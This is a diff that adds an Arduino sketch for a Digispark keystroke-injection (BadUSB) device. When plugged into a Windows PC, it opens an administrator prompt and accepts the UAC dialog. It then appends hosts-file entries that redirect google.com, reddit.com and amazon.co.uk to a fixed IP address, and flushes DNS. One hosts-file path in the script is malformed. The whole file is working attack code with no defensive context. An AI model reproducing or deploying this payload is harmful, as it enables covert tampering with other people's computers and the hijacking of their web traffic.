@@ -1,0 +1,21 @@
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("ECHO 143.166.83.38 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ECHO 143.166.83.38 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ECHO 143.166.83.38 www.reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ECHO 143.166.83.38 reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ECHO 143.166.83.38 www.amazon.co.uk >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ECHO 143.166.83.38 amazon.co.uk >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
+  DigiKeyboard.println("ipconfig /flushdns");
+  DigiKeyboard.println("exit");
+  for(;;){ /*empty*/ }
+}
